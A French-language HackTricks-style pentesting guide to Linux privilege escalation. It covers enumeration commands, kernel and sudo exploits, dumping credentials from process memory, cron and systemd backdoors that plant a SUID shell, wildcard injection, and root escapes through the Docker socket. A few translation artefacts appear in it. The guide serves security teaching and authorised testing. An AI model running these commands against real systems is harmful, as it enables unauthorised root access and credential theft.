# Élévation de privilèges Linux

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

## Informations système

### Infos sur le SE

Commençons par acquérir des connaissances sur le SE en cours d'exécution
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Chemin

Si vous **avez des autorisations d'écriture sur n'importe quel dossier à l'intérieur de la variable `PATH`**, vous pourriez être en mesure de détourner certaines bibliothèques ou binaires :
```bash
echo $PATH
```
### Informations sur l'environnement

Des informations intéressantes, des mots de passe ou des clés API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Exploits du noyau

Vérifiez la version du noyau et s'il existe une faille qui peut être utilisée pour escalader les privilèges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de noyaux vulnérables et certains **exploits déjà compilés** ici : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
D'autres sites où vous pouvez trouver des **exploits déjà compilés** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de noyaux vulnérables à partir de ce site web, vous pouvez faire :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Les outils qui pourraient aider à rechercher des exploits du noyau sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (exécuter sur la victime, vérifie uniquement les exploits pour le noyau 2.x)

Toujours **rechercher la version du noyau sur Google**, peut-être que votre version du noyau est mentionnée dans un exploit du noyau et alors vous serez sûr que cet exploit est valide.

### CVE-2016-5195 (DirtyCow)

Élévation de privilèges Linux - Noyau Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de Sudo

Basé sur les versions vulnérables de sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable en utilisant cette commande grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Échec de la vérification de la signature Dmesg

Consultez **la machine smasher2 de HTB** pour un **exemple** de la façon dont cette vulnérabilité pourrait être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus d'énumération du système
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity est un ensemble de patches pour le noyau Linux qui améliore la sécurité en ajoutant des fonctionnalités telles que RBAC (Role-Based Access Control), l'audit renforcé et la prévention des attaques de type "buffer overflow".
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield est une fonctionnalité de sécurité du noyau Linux qui vise à protéger contre les attaques de débordement de tampon en rendant les zones de mémoire non exécutables.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

**French Translation:**
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

Address Space Layout Randomization (ASLR) is a security technique used to prevent attackers from predicting memory addresses in order to exploit vulnerabilities such as buffer overflows. ASLR randomizes the memory layout of processes, making it harder for attackers to execute successful attacks.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Évasion de Docker

Si vous êtes à l'intérieur d'un conteneur Docker, vous pouvez essayer de vous échapper :

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Lecteurs

Vérifiez **ce qui est monté et démonté**, où et pourquoi. Si quelque chose est démonté, vous pourriez essayer de le monter et vérifier les informations privées.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérer les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
De plus, vérifiez si **un compilateur est installé**. Cela est utile si vous avez besoin d'utiliser une certaine exploitation du noyau car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une similaire)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels Vulnérables Installés

Vérifiez la **version des packages et services installés**. Il se peut qu'il y ait une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour escalader les privilèges...\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez un accès SSH à la machine, vous pouvez également utiliser **openVAS** pour vérifier si des logiciels obsolètes et vulnérables sont installés à l'intérieur de la machine.

{% hint style="info" %}
_Notez que ces commandes afficheront beaucoup d'informations qui seront principalement inutiles, il est donc recommandé d'utiliser des applications telles que OpenVAS ou similaires qui vérifieront si une version de logiciel installée est vulnérable à des exploits connus_
{% endhint %}

## Processus

Jetez un œil aux **processus** en cours d'exécution et vérifiez si un processus a **plus de privilèges qu'il ne le devrait** (peut-être un tomcat exécuté par root ?)
```bash
ps aux
ps -ef
top -n 1
```
Vérifiez toujours la présence éventuelle de [**débogueurs electron/cef/chromium** en cours d'exécution, vous pourriez les exploiter pour escalader les privilèges](electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également **vos privilèges sur les binaires des processus**, peut-être pouvez-vous écraser quelqu'un.

### Surveillance des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier les processus vulnérables exécutés fréquemment ou lorsque certains critères sont remplis.

### Mémoire des processus

Certains services d'un serveur enregistrent des **informations d'identification en clair dans la mémoire**.\
Normalement, vous aurez besoin de **privilèges root** pour lire la mémoire des processus appartenant à d'autres utilisateurs, donc cela est généralement plus utile lorsque vous êtes déjà root et que vous souhaitez découvrir plus d'informations d'identification.\
Cependant, rappelez-vous que **en tant qu'utilisateur régulier, vous pouvez lire la mémoire des processus que vous possédez**.

{% hint style="warning" %}
Notez qu'actuellement la plupart des machines **n'autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas extraire les processus appartenant à votre utilisateur non privilégié.

Le fichier _**/proc/sys/kernel/yama/ptrace\_scope**_ contrôle l'accessibilité de ptrace :

* **kernel.yama.ptrace\_scope = 0** : tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est la façon classique dont ptrace fonctionnait.
* **kernel.yama.ptrace\_scope = 1** : seul un processus parent peut être débogué.
* **kernel.yama.ptrace\_scope = 2** : Seul l'administrateur peut utiliser ptrace, car cela nécessite la capacité CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3** : Aucun processus ne peut être suivi avec ptrace. Une fois défini, un redémarrage est nécessaire pour réactiver le suivi avec ptrace.
{% endhint %}

#### GDB

Si vous avez accès à la mémoire d'un service FTP (par exemple), vous pourriez obtenir le tas (Heap) et rechercher à l'intérieur ses informations d'identification.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Pour un ID de processus donné, **les maps montrent comment la mémoire est cartographiée dans l'espace d'adressage virtuel de ce processus**; il montre également les **permissions de chaque région cartographiée**. Le fichier pseudo **mem expose la mémoire des processus eux-mêmes**. À partir du fichier **maps**, nous savons quelles **régions de mémoire sont lisibles** et leurs décalages. Nous utilisons ces informations pour **chercher dans le fichier mem et extraire toutes les régions lisibles** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fournit un accès à la mémoire **physique** du système, pas à la mémoire virtuelle. L'espace d'adressage virtuel du noyau peut être accédé en utilisant /dev/kmem.\
En général, `/dev/mem` n'est lisible que par l'utilisateur **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump pour Linux

ProcDump est une réinterprétation pour Linux de l'outil classique ProcDump de la suite d'outils Sysinternals pour Windows. Trouvez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Outils

Pour vider la mémoire d'un processus, vous pourriez utiliser :

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences de root et vider le processus détenu par vous
* Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Informations d'identification extraites de la mémoire du processus

#### Exemple manuel

Si vous constatez que le processus d'authentification est en cours d'exécution :
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez vider le processus (voir les sections précédentes pour trouver différentes façons de vider la mémoire d'un processus) et rechercher des informations d'identification à l'intérieur de la mémoire :
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler les informations d'identification en texte clair de la mémoire** et de certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.

| Fonctionnalité                                     | Nom du processus      |
| -------------------------------------------------- | --------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)    | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)  | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                           | lightdm               |
| VSFTPd (Connexions FTP actives)                    | vsftpd                |
| Apache2 (Sessions d'authentification HTTP Basic actives) | apache2           |
| OpenSSH (Sessions SSH actives - Utilisation de Sudo) | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches planifiées/Cron

Vérifiez si une tâche planifiée est vulnérable. Peut-être pouvez-vous profiter d'un script exécuté par root (vulnérabilité de joker ? peut modifier des fichiers utilisés par root ? utiliser des liens symboliques ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Chemin de Cron

Par exemple, à l'intérieur de _/etc/crontab_, vous pouvez trouver le CHEMIN : _CHEMIN=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Remarquez comment l'utilisateur "user" a des privilèges d'écriture sur /home/user_)

Si à l'intérieur de cette crontab, l'utilisateur root essaie d'exécuter une commande ou un script sans définir le chemin. Par exemple : _\* \* \* \* root overwrite.sh_\
Ensuite, vous pouvez obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron en utilisant un script avec un joker (Injection de joker)

Si un script est exécuté par root et contient un "**\***" dans une commande, vous pourriez exploiter cela pour provoquer des actions inattendues (comme une élévation de privilèges). Exemple :
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si l'astérisque est précédé d'un chemin comme** _**/some/path/\***_, **il n'est pas vulnérable (même** _**./\*** **ne l'est pas).**

Consultez la page suivante pour plus de techniques d'exploitation des astérisques :

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Écrasement de script Cron et lien symbolique

Si vous **pouvez modifier un script cron** exécuté par root, vous pouvez obtenir un shell très facilement :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire sur lequel vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et **de créer un lien symbolique vers un autre dossier** servant un script contrôlé par vous.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Tâches cron fréquentes

Vous pouvez surveiller les processus pour rechercher ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Peut-être pouvez-vous en profiter pour escalader les privilèges.

Par exemple, pour **surveiller toutes les 0,1s pendant 1 minute**, **trier par les commandes moins exécutées** et supprimer les commandes les plus exécutées, vous pouvez faire :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez également utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Tâches cron invisibles

Il est possible de créer une tâche cron **en ajoutant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et la tâche cron fonctionnera. Exemple (notez le caractère de retour chariot) :
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Fichiers _.service_ inscriptibles

Vérifiez si vous pouvez écrire un fichier `.service`, si c'est le cas, vous **pourriez le modifier** pour qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (vous devrez peut-être attendre le redémarrage de la machine).\
Par exemple, créez votre backdoor à l'intérieur du fichier .service avec **`ExecStart=/tmp/script.sh`**

### Binaires de service inscriptibles

Gardez à l'esprit que si vous avez des **permissions d'écriture sur des binaires exécutés par des services**, vous pouvez les modifier pour y ajouter des backdoors afin que lorsque les services seront ré-exécutés, les backdoors seront exécutés.

### Chemin systemd - Chemins relatifs

Vous pouvez voir le CHEMIN utilisé par **systemd** avec:
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **écrire** dans l'un des dossiers du chemin, vous pourriez être en mesure de **escalader les privilèges**. Vous devez rechercher les fichiers de configuration de service utilisant des **chemins relatifs** tels que :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** avec le **même nom que le binaire du chemin relatif** à l'intérieur du dossier PATH de systemd où vous pouvez écrire, et lorsque le service est appelé à exécuter l'action vulnérable (**Démarrer**, **Arrêter**, **Recharger**), votre **porte dérobée sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter les services mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Minuteries**

Les **minuteries** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` qui contrôlent les fichiers ou événements `**.service**`. Les **minuteries** peuvent être utilisées comme une alternative à cron car elles ont un support intégré pour les événements de temps calendrier et les événements de temps monotone et peuvent être exécutées de manière asynchrone.

Vous pouvez énumérer toutes les minuteries avec:
```bash
systemctl list-timers --all
```
### Timers inscriptibles

Si vous pouvez modifier un timer, vous pouvez le faire exécuter certains existants de systemd.unit (comme un `.service` ou un `.target`)
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu'est l'Unité :

> L'unité à activer lorsque ce minuteur s'écoule. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non spécifié, cette valeur est par défaut un service qui a le même nom que l'unité du minuteur, à l'exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l'unité activée et le nom de l'unité du minuteur soient nommés de manière identique, à l'exception du suffixe.

Par conséquent, pour abuser de cette autorisation, vous auriez besoin de :

* Trouver une unité systemd (comme un fichier `.service`) qui **exécute un binaire inscriptible**
* Trouver une unité systemd qui **exécute un chemin relatif** et pour lequel vous avez des **privilèges d'écriture** sur le **chemin de systemd** (pour vous faire passer pour cet exécutable)

**En savoir plus sur les minuteurs avec `man systemd.timer`.**

### **Activation du minuteur**

Pour activer un minuteur, vous avez besoin de privilèges root et d'exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Notez que le **timer** est **activé** en créant un lien symbolique vers celui-ci sur `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Les sockets Unix Domain (UDS) permettent la **communication entre processus** sur les mêmes machines ou sur des machines différentes dans des modèles client-serveur. Ils utilisent des fichiers de descripteurs Unix standard pour la communication inter-ordinateurs et sont configurés via des fichiers `.socket`.

Les sockets peuvent être configurés en utilisant des fichiers `.socket`.

**En savoir plus sur les sockets avec `man systemd.socket`.** À l'intérieur de ce fichier, plusieurs paramètres intéressants peuvent être configurés :

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : Ces options sont différentes mais un résumé est utilisé pour **indiquer où il va écouter** le socket (le chemin du fichier de socket AF\_UNIX, l'adresse IPv4/6 et/ou le numéro de port à écouter, etc.)
* `Accept` : Prend un argument booléen. Si **true**, une **instance de service est lancée pour chaque connexion entrante** et seul le socket de connexion est transmis. Si **false**, tous les sockets d'écoute eux-mêmes sont **transmis à l'unité de service démarrée**, et une seule unité de service est lancée pour toutes les connexions. Cette valeur est ignorée pour les sockets de datagrammes et les FIFO où une seule unité de service gère inconditionnellement tout le trafic entrant. **Par défaut à false**. Pour des raisons de performance, il est recommandé d'écrire de nouveaux démons uniquement de manière adaptée à `Accept=no`.
* `ExecStartPre`, `ExecStartPost` : Prend une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **créés** et liés, respectivement. Le premier jeton de la ligne de commande doit être un nom de fichier absolu, suivi des arguments pour le processus.
* `ExecStopPre`, `ExecStopPost` : **Commandes** supplémentaires qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **fermés** et supprimés, respectivement.
* `Service` : Spécifie le nom de l'**unité de service** à **activer** sur le **trafic entrant**. Ce paramètre n'est autorisé que pour les sockets avec Accept=no. Par défaut, il s'agit du service portant le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.

### Fichiers .socket inscriptibles

Si vous trouvez un fichier `.socket` **inscriptible**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et la porte dérobée sera exécutée avant la création du socket. Par conséquent, vous devrez **probablement attendre que la machine redémarre.**\
_Notez que le système doit utiliser cette configuration de fichier de socket ou la porte dérobée ne sera pas exécutée_

### Sockets inscriptibles

Si vous **identifiez un socket inscriptible** (_nous parlons maintenant de Sockets Unix et non des fichiers de configuration `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Énumérer les Sockets Unix
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemple d'exploitation :**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Notez qu'il peut y avoir des **sockets en écoute pour les requêtes HTTP** (_Je ne parle pas des fichiers .socket mais des fichiers agissant en tant que sockets Unix_). Vous pouvez vérifier cela avec :
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si le socket **répond avec une requête HTTP**, alors vous pouvez **communiquer** avec lui et peut-être **exploiter une vulnérabilité**.

### Socket Docker inscriptible

Le socket Docker, souvent trouvé à `/var/run/docker.sock`, est un fichier critique qui devrait être sécurisé. Par défaut, il est inscriptible par l'utilisateur `root` et les membres du groupe `docker`. Posséder un accès en écriture à ce socket peut entraîner une élévation de privilèges. Voici un aperçu de comment cela peut être fait et des méthodes alternatives si le CLI Docker n'est pas disponible.

#### **Élévation de privilèges avec le CLI Docker**

Si vous avez un accès en écriture au socket Docker, vous pouvez élever les privilèges en utilisant les commandes suivantes:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes vous permettent d'exécuter un conteneur avec un accès de niveau root au système de fichiers de l'hôte.

#### **Utilisation directe de l'API Docker**

Dans les cas où le CLI Docker n'est pas disponible, le socket Docker peut toujours être manipulé en utilisant l'API Docker et des commandes `curl`.

1.  **Lister les images Docker :** Récupérer la liste des images disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Créer un conteneur :** Envoyer une requête pour créer un conteneur qui monte le répertoire racine du système hôte.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Démarrer le conteneur nouvellement créé :

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Se connecter au conteneur :** Utiliser `socat` pour établir une connexion avec le conteneur, permettant l'exécution de commandes à l'intérieur.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Après avoir établi la connexion `socat`, vous pouvez exécuter des commandes directement dans le conteneur avec un accès de niveau root au système de fichiers de l'hôte.

### Autres

Notez que si vous avez des autorisations d'écriture sur le socket Docker car vous êtes **dans le groupe `docker`**, vous avez [**d'autres moyens d'escalader les privilèges**](interesting-groups-linux-pe/#docker-group). Si l' [**API Docker écoute sur un port** vous pouvez également compromettre](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consultez **d'autres moyens de s'échapper de Docker ou de l'exploiter pour escalader les privilèges** dans :

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Escalade de privilèges Containerd (ctr)

Si vous constatez que vous pouvez utiliser la commande **`ctr`**, lisez la page suivante car **vous pourriez l'exploiter pour escalader les privilèges** :

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Escalade de privilèges **RunC**

Si vous constatez que vous pouvez utiliser la commande **`runc`**, lisez la page suivante car **vous pourriez l'exploiter pour escalader les privilèges** :

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus est un système sophistiqué de **communication inter-processus (IPC)** qui permet aux applications d'interagir efficacement et de partager des données. Conçu pour le système Linux moderne, il offre un cadre robuste pour différents types de communication d'application.

Le système est polyvalent, prenant en charge une IPC de base qui améliore l'échange de données entre les processus, rappelant les **sockets de domaine UNIX améliorés**. De plus, il aide à diffuser des événements ou des signaux, favorisant une intégration transparente entre les composants du système. Par exemple, un signal d'un démon Bluetooth concernant un appel entrant peut inciter un lecteur de musique à se mettre en sourdine, améliorant ainsi l'expérience utilisateur. De plus, D-Bus prend en charge un système d'objets distants, simplifiant les demandes de service et les invocations de méthode entre les applications, rationalisant des processus traditionnellement complexes.

D-Bus fonctionne sur un modèle **autoriser/refuser**, gérant les autorisations de message (appels de méthode, émissions de signaux, etc.) en fonction de l'effet cumulatif des règles de stratégie correspondantes. Ces politiques spécifient les interactions avec le bus, permettant potentiellement une escalade de privilèges grâce à l'exploitation de ces autorisations.

Un exemple de cette politique dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni, détaillant les autorisations pour que l'utilisateur root possède, envoie et reçoive des messages de `fi.w1.wpa_supplicant1`.

Les politiques sans utilisateur ou groupe spécifié s'appliquent universellement, tandis que les politiques de contexte "par défaut" s'appliquent à tous ceux qui ne sont pas couverts par d'autres politiques spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Apprenez à énumérer et exploiter une communication D-Bus ici :**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
